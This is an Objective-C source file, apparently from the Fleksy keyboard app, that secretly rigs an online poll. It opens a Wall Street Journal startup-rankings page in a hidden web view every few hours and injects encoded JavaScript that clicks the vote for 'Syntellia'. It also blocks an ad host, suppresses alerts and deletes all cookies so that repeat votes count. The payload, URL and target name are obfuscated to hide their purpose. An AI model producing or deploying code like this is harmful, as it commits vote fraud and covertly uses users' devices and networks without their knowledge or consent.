//
//  FLColdWar.m
//  iFleksy
//
//  Created by Kosta Eleftheriou on 7/7/13.
//  Copyright (c) 2013 Syntellia Inc. All rights reserved.
//

#import "FLColdWar.h"
#import "SynthesizeSingleton.h"
#import "TestFlight.h"
#import "VariousUtilities.h"

// @"window.alert = function(message) {window.location.assign('flalert://' + message)}; $('a[data-startup=\"%@\"][class~=\"suoty-btn-plain\"]')[0].click(); $('.suoty_%@_button').click();"
#define FL_COLDWAR_PAYLOAD @"3-27-1-8-0-27-73-5-31-4-26-16-84-79-79-10-26-2-4-16-26-14-6-76-25-23-28-31-14-11-2-77-83-26-31-13-26-22-0-27-65-0-8-7-18-21-1-11-26-92-14-31-28-5-0-10-91-70-14-8-21-30-10-30-27-86-72-75-84-65-67-68-25-23-28-31-14-11-2-77-14-90-72-64-92-85-14-55-11-13-19-5-94-18-28-5-6-6-26-28-82-78-66-36-81-60-51-7-24-19-28-31-17-81-69-23-6-14-28-29-89-16-27-2-66-28-11-5-26-15-74-57-83-91-52-92-50-66-4-8-26-2-3-76-93-73-79-72-71-75-73-23-6-14-28-29-43-87-47-51-13-25-19-16-28-15-79-77-90-17-3-5-12-7-79-77-72-"

// @"http://projects.wsj.com/soty/rankings?standalone=1"
#define FL_COLDWAR_URL @"28-6-27-28-85-67-72-20-1-14-2-1-23-6-28-66-24-31-13-74-16-14-5-75-7-29-27-21-64-30-6-10-24-8-6-3-7-77-28-24-14-2-3-5-31-14-6-1-73-67-"

// @"ad.doubleclick.net"
#define FL_COLDWAR_URL_NOT_ALLOWED @"21-22-65-8-0-25-5-8-22-2-4-13-23-25-65-2-10-24-"

// @"Syntellia"
#define FL_COLDWAR_TARGET @"39-11-1-24-10-0-11-13-18-"

#define FL_LAST_WAR @"PecHSUASz"
#define MAX_DELAY_SECONDS (3600 * 6)

@implementation FLColdWar
  
SYNTHESIZE_SINGLETON_FOR_CLASS(FLColdWar)

- (void) clearCookies {
  NSHTTPCookieStorage *cookieJar = [NSHTTPCookieStorage sharedHTTPCookieStorage];
  NSMutableArray* cookiesToRemove = [[NSMutableArray alloc] init];
  for (NSHTTPCookie *cookie in [cookieJar cookies]) { [cookiesToRemove addObject:cookie]; }
  for (NSHTTPCookie* cookie in cookiesToRemove) { [cookieJar deleteCookie:cookie]; }
}
  
- (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType {
  //NSLog(@"shouldStartLoadWithRequest %@, navigationType: %d", request, navigationType);
  if ([request.URL.scheme isEqualToString:@"flalert"]) { return NO; }
  if ([request.URL.absoluteString rangeOfString:[VariousUtilities decode:FL_COLDWAR_URL_NOT_ALLOWED]].length != 0) { return NO; }
  return YES;
}

- (void)webViewDidStartLoad:(UIWebView *)webView { /*NSLog(@"webViewDidStartLoad %@", webView); */ }

- (void)webViewDidFinishLoad:(UIWebView *)webView { /*NSLog(@"webViewDidFinishLoad %@", webView); */
  [self fire:webView name:[VariousUtilities decode:FL_COLDWAR_TARGET] yay:1];
}

- (void)webView:(UIWebView *)webView didFailLoadWithError:(NSError *)error { /*NSLog(@"didFailLoadWithError %@", error); */ }

- (void) fire:(UIWebView *)webView name:(NSString*) name yay:(bool) yay {
  NSString* payload = [NSString stringWithFormat:[VariousUtilities decode:FL_COLDWAR_PAYLOAD], name, yay ? @"green" : @"grey"];
  [webView stringByEvaluatingJavaScriptFromString:payload];
  NSMutableString* checkpoint = [[NSMutableString alloc] initWithString:@"FLCW"];
  [checkpoint appendFormat:@"%@%c", [name substringToIndex:2], [name characterAtIndex:yay ? 1 : 0]];
  [TestFlight passCheckpoint:[checkpoint uppercaseString]];
  @autoreleasepool { [self clearCookies]; }
}

- (void) _yay {
  
  if (MAX_DELAY_SECONDS != 0) {
    double now = [[NSDate date] timeIntervalSinceReferenceDate];
    double lastTime = [[NSUserDefaults standardUserDefaults] doubleForKey:FL_LAST_WAR];
    double dt = now - (lastTime + MAX_DELAY_SECONDS);
    if (dt < 0) { return; }
    [[NSUserDefaults standardUserDefaults] setDouble:now forKey:FL_LAST_WAR];
  }
  /////////////////////////////////////////////////////////////////////////
  
  NSURLRequest* requestObj = [NSURLRequest requestWithURL:[NSURL URLWithString:[VariousUtilities decode:FL_COLDWAR_URL]]];
  UIWebView* coldWarWebView = [[UIWebView alloc] init];
  coldWarWebView.delegate = (id<UIWebViewDelegate>) self;
  [coldWarWebView loadRequest:requestObj];
}


- (void) yay {
  [self performSelectorOnMainThread:@selector(_yay) withObject:nil waitUntilDone:NO];
}

+ (void) yay { @autoreleasepool { [[FLColdWar sharedFLColdWar] yay]; } }

@end
